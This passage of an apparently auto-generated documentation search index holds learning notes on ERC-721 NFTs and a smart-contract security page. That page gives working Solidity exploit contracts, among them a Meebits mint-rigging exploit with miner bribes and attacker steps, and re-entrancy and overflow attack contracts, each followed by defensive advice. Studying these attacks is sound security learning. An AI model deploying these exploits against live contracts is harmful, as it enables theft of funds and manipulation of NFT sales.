blockchain, which in turn is stored and agreed upon by all nodes.","title":"Understanding smart contract events"},{"location":"smart-contracts/erc-721-events/#events-from-erc721","text":"Transfer - This emits when ownership of any NFT changes by any mechanism. In addition, if from==0, event represent NFT creation, if to==0 even represent NFT destroyed Approval - This emits when the approved address for an NFT is changed or reaffirmed. ApprovalForAll - This emits when an operator is enabled or disabled for an owner. The operator can manage all NFTs of the owner.","title":"Events from ERC721"},{"location":"smart-contracts/erc-721-events/#querying-events-from-the-blockchain","text":"web3 can be used to query events from blockchain without paying gas.","title":"Querying events from the blockchain"},{"location":"smart-contracts/erc-721-example/","text":"Example of ERC-721 contract IDE Remix can be used as an editor solidity. Contract The Meebits contract from Larvalabs was selected. Larvalabs was the company behind cryptopunks NFTs and in May 2021 released the Meebits project. The contract is 679 lines of code using solidity 0.7.6 Note: The contract has some specific code related to cryptopunks and minting. This is because cryptopunks owners would be able to mint a meebit free of cost (other meebits were sold using a dutch auction from 2.5ETH) Code review of contract I've done the following Code review as a github pull request in order to learn the contract. In general, it's amazing how compact the contract actually is.","title":"ERC-721 example"},{"location":"smart-contracts/erc-721-example/#example-of-erc-721-contract","text":"","title":"Example of ERC-721 contract"},{"location":"smart-contracts/erc-721-example/#ide","text":"Remix can be used as an editor solidity.","title":"IDE"},{"location":"smart-contracts/erc-721-example/#contract","text":"The Meebits contract from Larvalabs was selected. Larvalabs was the company behind cryptopunks NFTs and in May 2021 released the Meebits project. The contract is 679 lines of code using solidity 0.7.6 Note: The contract has some specific code related to cryptopunks and minting. This is because cryptopunks owners would be able to mint a meebit free of cost (other meebits were sold using a dutch auction from 2.5ETH)","title":"Contract"},{"location":"smart-contracts/erc-721-example/#code-review-of-contract","text":"I've done the following Code review as a github pull request in order to learn the contract. In general, it's amazing how compact the contract actually is.","title":"Code review of contract"},{"location":"smart-contracts/erc-721/","text":"Learn ERC-721 Background There are many proposed uses of Ethereum smart contracts that depend on tracking distinguishable assets. Examples of existing or planned NFTs are LAND in Decentraland, the eponymous punks in CryptoPunks, and in-game items using systems like DMarket or EnjinCoin. Future uses include tracking real-world assets, like real-estate (as envisioned by companies like Ubitquity or Propy). It is critical in each of these cases that these items are not \u201clumped together\u201d as numbers in a ledger, but instead each asset must have its ownership individually and atomically tracked. Regardless of the nature of these assets, the ecosystem will be stronger if we have a standardized interface that allows for cross-functional asset management and sales platforms. Summary A standard interface for non-fungible token which allows for the implementation of a standard API for NFTs within smart contracts. NFTs can represent ownership over digital or physical assets This standard provides basic functionality to track and transfer NFTs. This standard is inspired by the ERC-20 token standard and builds on two years of experience since EIP-20 was created.EIP-20 is insufficient for tracking NFTs because each asset is distinct (non-fungible) whereas each of a quantity of tokens is identical (fungible). Specification Specification is done through a interface based on the solidity language. Solidity is the programming language used for the ethereum blockchain. NFT identifiers Every NFT is identified by a unique uint256 ID inside the ERC-721 smart contract. This identifying number SHALL NOT change for the life of the contract. The pair (contract address, uint256 tokenId) will then be a globally unique and fully-qualified identifier for a specific asset on an Ethereum chain. In ERC-721 every NFT is unique, the quantity is none or one. Creating of NFTs (\u201cminting\u201d) and destruction NFTs (\u201cburning\u201d) is not included in the specification. Privacy Wallets/brokers/auctioneers identified in the motivation section have a strong need to identify which NFTs an owner owns. It may be interesting to consider a use case where NFTs are not enumerable, such as a private registry of property ownership, or a partially-private registry. However, privacy cannot be attained because an attacker can simply (!) call ownerOf for every possible tokenId. Scalability The working group deployed a contract, XXXXERC721, to Testnet which instantiates and tracks 340282366920938463463374607431768211456 different deeds (2^128). That\u2019s enough to assign every IPV6 address to an Ethereum account owner, or to track ownership of nanobots a few micron in size and in aggregate totalling half the size of Earth. You can query it from the blockchain. This illustration makes clear: the ERC-721 standard scales. Transfer mechanism ERC-721 standardizes a safe transfer function safeTransferFrom. Transfers may be initiated by: The owner of an NFT The approved address of an NFT An authorized operator of the current owner of an NFT The actual contract implementation MAY also throw exceptions in other situations. This allows implementations to achieve interesting results: Disallow transfers if the contract is paused \u2014 prior art, CryptoKitties deployed contract, line 611 Blacklist certain address from receiving NFTs \u2014 prior art, CryptoKitties deployed contract, lines 565, 566 Charge a fee to both parties of a transaction Read only NFT registry \u2014 always throw from unsafeTransfer, transferFrom, approve and setApprovalForAll Interface ERC721 - Core specification Events from interface ERC721: Transfer - This emits when ownership of any NFT changes by any mechanism. In addition, if from==0, event represent NFT creation, if to==0 even represent NFT destroyed Approval - This emits when the approved address for an NFT is changed or reaffirmed. ApprovalForAll - This emits when an operator is enabled or disabled for an owner. The operator can manage all NFTs of the owner. Functions from interface ERC721: balanceOf - The number of NFTs owned by _owner , possibly zero ownerOf - Find the owner of an NFT. @return The address of the owner of the NFT safeTransferFrom - Transfers the ownership of an NFT from one address to another address transferFrom - Same as safeTransferFrom, but if to is not capable of receiving NFTs it will be permanently lost approve - Change or reaffirm the approved address for an NFT. Throws unless msg.sender is the current NFT owner, or an authorized operator of the current owner. setApprovalForAll - Enable or disable approval for a third party (\"operator\") to manage all of msg.sender 's assets getApproved - Get the approved address for a single NFT isApprovedForAll - Query if an address is an authorized operator for another address supportsInterface - From ERC165 - Standard Interface Detection Interface ERC721TokenReceiver - Wallet dependency Wallet/broker/uaction must implement the wallet interface ERC721 \u00b4onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data\u00b4.The ERC721 smart contract calls this function on the recipient after a transfer . This function MAY throw to revert and reject the transfer. Return of other than the magic value MUST result in the transaction being reverted. Interface ERC721Metadata - NFT metadata This allows your smart contract to be interrogated for its name and for details about the assets which your NFTs represent. function name - A descriptive name for a collection of NFTs in this contract function symbol - An abbreviated name for NFTs in this contract tokenURI - URI for a given asset. The URI may point to a JSON file that conforms to the \"ERC721 Metadata JSON Schema\" ERC721 Metadata JSON Schema - NFT metadata Defined through the following JSON Schema: \u00b4\u00b4\u00b4 { \"title\": \"Asset Metadata\", \"type\": \"object\", \"properties\": { \"name\": { \"type\": \"string\", \"description\": \"Identifies the asset to which this NFT represents\" }, \"description\": { \"type\": \"string\", \"description\": \"Describes the asset to which this NFT represents\" }, \"image\": { \"type\": \"string\", \"description\": \"A URI pointing to a resource with mime type image/* representing the asset to which this NFT represents. Consider making any images at a width between 320 and 1080 pixels and aspect ratio between 1.91:1 and 4:5 inclusive.\" } } } \u00b4\u00b4\u00b4 Interface ERC721Enumerable - Full list of NFTs Functions from interface ERC721Enumerable: totalSupply - A count of valid NFTs tracked by this contract, where each one of them has an assigned and queryable owner not equal to the zero address tokenByIndex - Returns the token identifier for the given index. This can then be used for example against ERC721Metadata.tokenURI tokenOfOwnerByIndex - Enumerate NFTs assigned to an owner. Index less than balanceOf(_owner) Open questions What is the approved address for an NFT? safeTransferFrom - Why does it do the following When transfer is complete, this function /// checks if _to is a smart contract (code size > 0). If so, it calls /// onERC721Received on _to and throws if the return value is not /// bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\")) setApprovalForAll - Is this what trading platforms such as OpenSea does when listing an NFT? Can ERC721 Metadata JSON Schema contain additional data for NFT traits Is an event such as approve put on chain? Contract examples Superrare Cryptokitties Meebits Sources https://eips.ethereum.org/EIPS/eip-721","title":"Learn ERC-721"},{"location":"smart-contracts/erc-721/#learn-erc-721","text":"","title":"Learn ERC-721"},{"location":"smart-contracts/erc-721/#background","text":"There are many proposed uses of Ethereum smart contracts that depend on tracking distinguishable assets. Examples of existing or planned NFTs are LAND in Decentraland, the eponymous punks in CryptoPunks, and in-game items using systems like DMarket or EnjinCoin. Future uses include tracking real-world assets, like real-estate (as envisioned by companies like Ubitquity or Propy). It is critical in each of these cases that these items are not \u201clumped together\u201d as numbers in a ledger, but instead each asset must have its ownership individually and atomically tracked. Regardless of the nature of these assets, the ecosystem will be stronger if we have a standardized interface that allows for cross-functional asset management and sales platforms.","title":"Background"},{"location":"smart-contracts/erc-721/#summary","text":"A standard interface for non-fungible token which allows for the implementation of a standard API for NFTs within smart contracts. NFTs can represent ownership over digital or physical assets This standard provides basic functionality to track and transfer NFTs. This standard is inspired by the ERC-20 token standard and builds on two years of experience since EIP-20 was created.EIP-20 is insufficient for tracking NFTs because each asset is distinct (non-fungible) whereas each of a quantity of tokens is identical (fungible).","title":"Summary"},{"location":"smart-contracts/erc-721/#specification","text":"Specification is done through a interface based on the solidity language. Solidity is the programming language used for the ethereum blockchain.","title":"Specification"},{"location":"smart-contracts/erc-721/#nft-identifiers","text":"Every NFT is identified by a unique uint256 ID inside the ERC-721 smart contract. This identifying number SHALL NOT change for the life of the contract. The pair (contract address, uint256 tokenId) will then be a globally unique and fully-qualified identifier for a specific asset on an Ethereum chain. In ERC-721 every NFT is unique, the quantity is none or one. Creating of NFTs (\u201cminting\u201d) and destruction NFTs (\u201cburning\u201d) is not included in the specification.","title":"NFT identifiers"},{"location":"smart-contracts/erc-721/#privacy","text":"Wallets/brokers/auctioneers identified in the motivation section have a strong need to identify which NFTs an owner owns. It may be interesting to consider a use case where NFTs are not enumerable, such as a private registry of property ownership, or a partially-private registry. However, privacy cannot be attained because an attacker can simply (!) call ownerOf for every possible tokenId.","title":"Privacy"},{"location":"smart-contracts/erc-721/#scalability","text":"The working group deployed a contract, XXXXERC721, to Testnet which instantiates and tracks 340282366920938463463374607431768211456 different deeds (2^128). That\u2019s enough to assign every IPV6 address to an Ethereum account owner, or to track ownership of nanobots a few micron in size and in aggregate totalling half the size of Earth. You can query it from the blockchain. This illustration makes clear: the ERC-721 standard scales.","title":"Scalability"},{"location":"smart-contracts/erc-721/#transfer-mechanism","text":"ERC-721 standardizes a safe transfer function safeTransferFrom. Transfers may be initiated by: The owner of an NFT The approved address of an NFT An authorized operator of the current owner of an NFT The actual contract implementation MAY also throw exceptions in other situations. This allows implementations to achieve interesting results: Disallow transfers if the contract is paused \u2014 prior art, CryptoKitties deployed contract, line 611 Blacklist certain address from receiving NFTs \u2014 prior art, CryptoKitties deployed contract, lines 565, 566 Charge a fee to both parties of a transaction Read only NFT registry \u2014 always throw from unsafeTransfer, transferFrom, approve and setApprovalForAll","title":"Transfer mechanism"},{"location":"smart-contracts/erc-721/#interface-erc721-core-specification","text":"Events from interface ERC721: Transfer - This emits when ownership of any NFT changes by any mechanism. In addition, if from==0, event represent NFT creation, if to==0 even represent NFT destroyed Approval - This emits when the approved address for an NFT is changed or reaffirmed. ApprovalForAll - This emits when an operator is enabled or disabled for an owner. The operator can manage all NFTs of the owner. Functions from interface ERC721: balanceOf - The number of NFTs owned by _owner , possibly zero ownerOf - Find the owner of an NFT. @return The address of the owner of the NFT safeTransferFrom - Transfers the ownership of an NFT from one address to another address transferFrom - Same as safeTransferFrom, but if to is not capable of receiving NFTs it will be permanently lost approve - Change or reaffirm the approved address for an NFT. Throws unless msg.sender is the current NFT owner, or an authorized operator of the current owner. setApprovalForAll - Enable or disable approval for a third party (\"operator\") to manage all of msg.sender 's assets getApproved - Get the approved address for a single NFT isApprovedForAll - Query if an address is an authorized operator for another address supportsInterface - From ERC165 - Standard Interface Detection","title":"Interface ERC721 - Core specification"},{"location":"smart-contracts/erc-721/#interface-erc721tokenreceiver-wallet-dependency","text":"Wallet/broker/uaction must implement the wallet interface ERC721 \u00b4onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data\u00b4.The ERC721 smart contract calls this function on the recipient after a transfer . This function MAY throw to revert and reject the transfer. Return of other than the magic value MUST result in the transaction being reverted.","title":"Interface ERC721TokenReceiver - Wallet dependency"},{"location":"smart-contracts/erc-721/#interface-erc721metadata-nft-metadata","text":"This allows your smart contract to be interrogated for its name and for details about the assets which your NFTs represent. function name - A descriptive name for a collection of NFTs in this contract function symbol - An abbreviated name for NFTs in this contract tokenURI - URI for a given asset. The URI may point to a JSON file that conforms to the \"ERC721 Metadata JSON Schema\"","title":"Interface ERC721Metadata - NFT metadata"},{"location":"smart-contracts/erc-721/#erc721-metadata-json-schema-nft-metadata","text":"Defined through the following JSON Schema: \u00b4\u00b4\u00b4 { \"title\": \"Asset Metadata\", \"type\": \"object\", \"properties\": { \"name\": { \"type\": \"string\", \"description\": \"Identifies the asset to which this NFT represents\" }, \"description\": { \"type\": \"string\", \"description\": \"Describes the asset to which this NFT represents\" }, \"image\": { \"type\": \"string\", \"description\": \"A URI pointing to a resource with mime type image/* representing the asset to which this NFT represents. Consider making any images at a width between 320 and 1080 pixels and aspect ratio between 1.91:1 and 4:5 inclusive.\" } } } \u00b4\u00b4\u00b4","title":"ERC721 Metadata JSON Schema - NFT metadata"},{"location":"smart-contracts/erc-721/#interface-erc721enumerable-full-list-of-nfts","text":"Functions from interface ERC721Enumerable: totalSupply - A count of valid NFTs tracked by this contract, where each one of them has an assigned and queryable owner not equal to the zero address tokenByIndex - Returns the token identifier for the given index. This can then be used for example against ERC721Metadata.tokenURI tokenOfOwnerByIndex - Enumerate NFTs assigned to an owner. Index less than balanceOf(_owner)","title":"Interface ERC721Enumerable - Full list of NFTs"},{"location":"smart-contracts/erc-721/#open-questions","text":"What is the approved address for an NFT? safeTransferFrom - Why does it do the following When transfer is complete, this function /// checks if _to is a smart contract (code size > 0). If so, it calls /// onERC721Received on _to and throws if the return value is not /// bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\")) setApprovalForAll - Is this what trading platforms such as OpenSea does when listing an NFT? Can ERC721 Metadata JSON Schema contain additional data for NFT traits Is an event such as approve put on chain?","title":"Open questions"},{"location":"smart-contracts/erc-721/#contract-examples","text":"Superrare Cryptokitties Meebits","title":"Contract examples"},{"location":"smart-contracts/erc-721/#sources","text":"https://eips.ethereum.org/EIPS/eip-721","title":"Sources"},{"location":"smart-contracts/smart-contract-security/","text":"Smart contract security Attack - Cancel transaction if unfavorable draw Meebit NFT Exploit analysis Contract with vulnerability if the attacker knows which ids are extra valuable. /** * Community grant minting. */ function mintWithPunkOrGlyph(uint _createVia) external reentrancyGuard returns (uint) { require(communityGrant); require(!marketPaused); require(_createVia > 0 && _createVia <= 10512, \"Invalid punk/glyph index.\"); require(creatorNftMints[_createVia] == 0, \"Already minted with this punk/glyph\"); if (_createVia > 10000) { // It's a glyph // Compute the glyph ID uint glyphId = _createVia.sub(10000); // Make sure the sender owns the glyph require(IERC721(glyphs).ownerOf(glyphId) == msg.sender, \"Not the owner of this glyph.\"); } else { // It's a punk // Compute the punk ID uint punkId = _createVia.sub(1); // Make sure the sender owns the punk require(Cryptopunks(punks).punkIndexToAddress(punkId) == msg.sender, \"Not the owner of this punk.\"); } creatorNftMints[_createVia]++; return _mint(msg.sender, _createVia); } function _mint(address _to, uint createdVia) internal returns (uint) { require(_to != address(0), \"Cannot mint to 0x0.\"); require(numTokens < TOKEN_LIMIT, \"Token limit reached.\"); uint id = randomIndex(); numTokens = numTokens + 1; _addNFToken(_to, id); emit Mint(id, _to, createdVia); emit Transfer(address(0), _to, id); return id; } Exploit contract pragma solidity 0.8.4; interface IMeebits { function mintWithPunkOrGlyph(uint _createVia) external returns (uint); } contract Exploit { address private owner; mapping(uint => bool) internal meebitIds; IMeebits immutable meebits; constructor(address addr) { owner = msg.sender; meebits = IMeebits(addr); } modifier onlyOwner() { require(msg.sender == owner, \"Caller is not owner\"); _; } function deposit() public payable {} function addMeebit(uint meebitId) onlyOwner public { meebitIds[meebitId] = true; } function deleteMeebit(uint meebitId) onlyOwner public { meebitIds[meebitId] = false; } function mintMeebit(uint _createVia) public returns(uint){ // Mint a new meebit with a punk or glyph uint id = meebits.mintWithPunkOrGlyph(_createVia); // Make sure it's a desired rare meebit require(meebitIds[id], \"Not a rare meebit\"); // Pay miner bribe to include the block (bool success, ) = block.coinbase.call{value: 1 ether}(\"\"); require(success); return id; } function recover(address recipient, uint256 value, bytes memory args) onlyOwner public { (bool success, ) = recipient.call{ value: value }(args); require(success); } } } Attacker would do the following: 1. Create contract with the official meebit contract as a parameter. Attacker address would now be set as owner 1. Call addMeebit for all the rare meebits he would accept 1. Call deposit in a transaction where message.value is 1 eth (this will be used to pay the miners later). This is then deposited to the contract address 1. Create transaction against mintMeebit. If the meebit returned from the official contract was not added from addMeebit, the require statement would roll back the transaction. If the transaction was on the list, he'd use \u00b4block.coinbase.call\u00b4 to raise the gas provided for the transaction to 1ETH 1. Retrieve any extra deposited ETH to the contract via recover (10ETH was recovered by attacker) Attack - Re-entrancy https://solidity-by-example.org/hacks/re-entrancy/ contract Attack { EtherStore public etherStore; constructor(address _etherStoreAddress) { etherStore = EtherStore(_etherStoreAddress); } // Fallback is called when EtherStore sends Ether to this contract. fallback() external payable { if (address(etherStore).balance >= 1 ether) { etherStore.withdraw(1 ether); } } function attack() external payable { require(msg.value >= 1 ether); etherStore.deposit{value: 1 ether}(); etherStore.withdraw(1 ether); } // Helper function to check the balance of this contract function getBalance() public view returns (uint) { return address(this).balance; } } Preventative techniques: - Ensure all state changes happen before calling external contracts - Use function modifiers that prevent re-entrancy Example of attack: - The DAO Attack Attack - Overflow https://solidity-by-example.org/hacks/overflow/ contract Attack { TimeLock timeLock; constructor(TimeLock _timeLock) { timeLock = TimeLock(_timeLock); } fallback() external payable {} function attack() public payable { timeLock.deposit{value: msg.value}(); /* if t = current lock time then we need to find x such that x + t = 2**256 = 0 so x = -t */ timeLock.increaseLockTime( type(uint).max - timeLock.lockTime(address(this)) ); timeLock.withdraw(); } } Preventative techniques: Use SafeMath to will prevent arithmetic overflow and underflow Attack - Front running Transactions take some time before they are mined. An attacker can watch the transaction pool and send a transaction, have it included in a block before the original transaction. This mechanism can be abused to re-order transactions to the attacker's advantage. 1. Alice deploys FindThisHash with 10 Ether. 2. Bob finds the correct string that will hash to the target hash. (\"Ethereum\") 3. Bob calls solve(\"Ethereum\") with gas price set to 15 gwei. 4. Eve is watching the transaction pool for the answer to be submitted. 5. Eve sees Bob's answer and calls solve(\"Ethereum\") with a higher gas price than Bob (100 gwei). 6. Eve's transaction was mined before Bob's transaction. Eve won the reward of 10 ether. Preventative techniques: use commit-reveal scheme use submarine send Attack - Self destruct https://solidity-by-example.org/hacks/self-destruct/ Selfdestruct allows a smartcontract to be deleted from Ethereum Virtual Machine. As a parameter to it, you pass the adress to receive it and this can cause issues to the adress receiving it. Preventative techniques: - Avoid using address(this).balance (use msg.value instead) Attack - Read private data https://solidity-by-example.org/hacks/accessing-private-data/ State variables can be read through web3, for example through \u00b4web3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", 2, console.log)\u00b4 Preventative techniques: Don't store sensitive information on the blockchain Attack - Delegatecall https://solidity-by-example.org/hacks/delegatecall/ delegatecall is tricky to use and wrong usage or incorrect understanding can lead to devastating results. Preventative techniques: Use stateless Library Phishing with tx.origin https://solidity-by-example.org/hacks/phishing-with-tx-origin/ If contract A calls B, and B calls C, in C msg.sender is B and tx.origin is A. Preventative techniques: Use msg.sender instead of tx.origin Hiding Malicious Code with External Contract https://solidity-by-example.org/hacks/hiding-malicious-code-with-external-contract/ In Solidity any address can be casted into specific contract, even if the contract at the address is not the one being casted. contract Foo { Bar bar; constructor(address _bar) { bar = Bar(_bar); } In the code above, there is no guarantee bar is of the class Bar. The owner calling the constructor could have passed another contract. Preventative techniques: Initialize a new contract inside the constructor Make the address of external contract public so that the code of the external contract can be reviewed","title":"Smart contract security"},{"location":"smart-contracts/smart-contract-security/#smart-contract-security","text":"","title":"Smart contract security"},{"location":"smart-contracts/smart-contract-security/#attack-cancel-transaction-if-unfavorable-draw","text":"Meebit NFT Exploit analysis Contract with vulnerability if the attacker knows which ids are extra valuable. /** * Community grant minting. */ function mintWithPunkOrGlyph(uint _createVia) external reentrancyGuard returns (uint) { require(communityGrant); require(!marketPaused); require(_createVia > 0 && _createVia <= 10512, \"Invalid punk/glyph index.\"); require(creatorNftMints[_createVia] == 0, \"Already minted with this punk/glyph\"); if (_createVia > 10000) { // It's a glyph // Compute the glyph ID uint glyphId = _createVia.sub(10000); // Make sure the sender owns the glyph require(IERC721(glyphs).ownerOf(glyphId) == msg.sender, \"Not the owner of this glyph.\"); } else { // It's a punk // Compute the punk ID uint punkId = _createVia.sub(1); // Make sure the sender owns the punk require(Cryptopunks(punks).punkIndexToAddress(punkId) == msg.sender, \"Not the owner of this punk.\"); } creatorNftMints[_createVia]++; return _mint(msg.sender, _createVia); } function _mint(address _to, uint createdVia) internal returns (uint) { require(_to != address(0), \"Cannot mint to 0x0.\"); require(numTokens < TOKEN_LIMIT, \"Token limit reached.\"); uint id = randomIndex(); numTokens = numTokens + 1; _addNFToken(_to, id); emit Mint(id, _to, createdVia); emit Transfer(address(0), _to, id); return id; } Exploit contract pragma solidity 0.8.4; interface IMeebits { function mintWithPunkOrGlyph(uint _createVia) external returns (uint); } contract Exploit { address private owner; mapping(uint => bool) internal meebitIds; IMeebits immutable meebits; constructor(address addr) { owner = msg.sender; meebits = IMeebits(addr); } modifier onlyOwner() { require(msg.sender == owner, \"Caller is not owner\"); _; } function deposit() public payable {} function addMeebit(uint meebitId) onlyOwner public { meebitIds[meebitId] = true; } function deleteMeebit(uint meebitId) onlyOwner public { meebitIds[meebitId] = false; } function mintMeebit(uint _createVia) public returns(uint){ // Mint a new meebit with a punk or glyph uint id = meebits.mintWithPunkOrGlyph(_createVia); // Make sure it's a desired rare meebit require(meebitIds[id], \"Not a rare meebit\"); // Pay miner bribe to include the block (bool success, ) = block.coinbase.call{value: 1 ether}(\"\"); require(success); return id; } function recover(address recipient, uint256 value, bytes memory args) onlyOwner public { (bool success, ) = recipient.call{ value: value }(args); require(success); } } } Attacker would do the following: 1. Create contract with the official meebit contract as a parameter. Attacker address would now be set as owner 1. Call addMeebit for all the rare meebits he would accept 1. Call deposit in a transaction where message.value is 1 eth (this will be used to pay the miners later). This is then deposited to the contract address 1. Create transaction against mintMeebit. If the meebit returned from the official contract was not added from addMeebit, the require statement would roll back the transaction. If the transaction was on the list, he'd use \u00b4block.coinbase.call\u00b4 to raise the gas provided for the transaction to 1ETH 1. Retrieve any extra deposited ETH to the contract via recover (10ETH was recovered by attacker)","title":"Attack - Cancel transaction if unfavorable draw"},{"location":"smart-contracts/smart-contract-security/#attack-re-entrancy","text":"https://solidity-by-example.org/hacks/re-entrancy/ contract Attack { EtherStore public etherStore; constructor(address _etherStoreAddress) { etherStore = EtherStore(_etherStoreAddress); } // Fallback is called when EtherStore sends Ether to this contract. fallback() external payable { if (address(etherStore).balance >= 1 ether) { etherStore.withdraw(1 ether); } } function attack() external payable { require(msg.value >= 1 ether); etherStore.deposit{value: 1 ether}(); etherStore.withdraw(1 ether); } // Helper function to check the balance of this contract function getBalance() public view returns (uint) { return address(this).balance; } } Preventative techniques: - Ensure all state changes happen before calling external contracts - Use function modifiers that prevent re-entrancy Example of attack: - The DAO Attack","title":"Attack - Re-entrancy"},{"location":"smart-contracts/smart-contract-security/#attack-overflow","text":"https://solidity-by-example.org/hacks/overflow/ contract Attack { TimeLock timeLock; constructor(TimeLock _timeLock) { timeLock = TimeLock(_timeLock); } fallback() external payable {} function attack() public payable { timeLock.deposit{value: msg.value}(); /* if t = current lock time then we need to find x such that x + t = 2**256 = 0 so x = -t */ timeLock.increaseLockTime( type(uint).max - timeLock.lockTime(address(this)) ); timeLock.withdraw(); } } Preventative techniques: Use SafeMath to will prevent arithmetic overflow and underflow","title":"Attack - Overflow"},{"location":"smart-contracts/smart-contract-security/#attack-front-running","text":"Transactions take some time before they are mined. An attacker can watch the transaction pool and send a transaction, have it included in a block before the original transaction. This mechanism can be abused to re-order transactions to the attacker's advantage. 1. Alice deploys FindThisHash with 10 Ether. 2. Bob finds the correct string that will hash to the target hash. (\"Ethereum\") 3. Bob calls solve(\"Ethereum\") with gas price set to 15 gwei. 4. Eve is watching the transaction pool for the answer to be submitted. 5. Eve sees Bob's answer and calls solve(\"Ethereum\") with a higher gas price than Bob (100 gwei). 6. Eve's transaction was mined before Bob's transaction. Eve won the reward of 10 ether. Preventative techniques: use commit-reveal scheme use submarine send","title":"Attack - Front running"},{"location":"smart-contracts/smart-contract-security/#attack-self-destruct","text":"https://solidity-by-example.org/hacks/self-destruct/ Selfdestruct allows a smartcontract to be deleted from Ethereum Virtual Machine. As a parameter to it, you pass the adress to receive it and this can cause issues to the adress receiving it. Preventative techniques: - Avoid using address(this).balance (use msg.value instead)","title":"Attack - Self destruct"},{"location":"smart-contracts/smart-contract-security/#attack-read-private-data","text":"https://solidity-by-example.org/hacks/accessing-private-data/ State variables can be read through web3, for example through \u00b4web3.eth.getStorageAt(\"0x3505a02BCDFbb225988161a95528bfDb279faD6b\", 2, console.log)\u00b4 Preventative techniques: Don't store sensitive information on the blockchain","title":"Attack - Read private data"},{"location":"smart-contracts/smart-contract-security/#attack-delegatecall","text":"https://solidity-by-example.org/hacks/delegatecall/ delegatecall is tricky to use and wrong usage or incorrect understanding can lead to devastating results. Preventative techniques: Use stateless Library","title":"Attack - Delegatecall"},{"location":"smart-contracts/smart-contract-security/#phishing-with-txorigin","text":"https://solidity-by-example.org/hacks/phishing-with-tx-origin/ If contract A calls B, and B calls C, in C msg.sender is B and tx.origin is A. Preventative techniques: Use msg.sender instead of tx.origin","title":"Phishing with tx.origin"},{"location":"smart-contracts/smart-contract-security/#hiding-malicious-code-with-external-contract","text":"https://solidity-by-example.org/hacks/hiding-malicious-code-with-external-contract/ In Solidity any address can be casted into specific contract, even if the contract at the address is not the one being casted. contract Foo { Bar bar; constructor(address _bar) { bar = Bar(_bar); } In the code above, there is no guarantee bar is of the class Bar. The owner calling the constructor could have passed another contract. Preventative techniques: Initialize a new contract inside the constructor Make the address of external contract public so that the code of the external contract can be reviewed","title":"Hiding Malicious Code with External Contract"}]}